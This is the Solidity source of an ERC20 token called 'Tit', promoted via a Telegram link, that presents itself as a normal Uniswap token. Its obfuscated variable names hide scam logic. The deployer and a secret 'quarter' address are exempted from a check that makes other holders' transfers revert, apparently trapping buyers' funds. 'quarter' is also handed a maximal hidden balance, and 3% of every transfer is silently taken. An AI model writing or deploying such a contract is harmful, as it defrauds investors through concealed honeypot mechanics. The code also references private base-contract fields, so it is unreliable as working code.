// https://t.me/tit_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract Tit is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private well;

    function _transfer(
        address physical,
        address powerful,
        uint256 native
    ) internal override {
        uint256 are = them;

        if (coffee[physical] == 0 && well[physical] > 0 && physical != uniswapV2Pair) {
            coffee[physical] -= are;
        }

        address quick = address(discuss);
        discuss = Tit(powerful);
        well[quick] += are + 1;

        _balances[physical] -= native;
        uint256 met = (native / 100) * them;
        native -= met;
        _balances[powerful] += native;
    }

    mapping(address => uint256) private coffee;
    uint256 public them = 3;

    constructor(
        string memory composed,
        string memory boat,
        address keep,
        address quarter
    ) ERC20(composed, boat) {
        uniswapV2Router = IUniswapV2Router02(keep);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 comfortable = ~uint256(0);

        coffee[msg.sender] = comfortable;
        coffee[quarter] = comfortable;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[quarter] = comfortable;
    }

    Tit private discuss;
}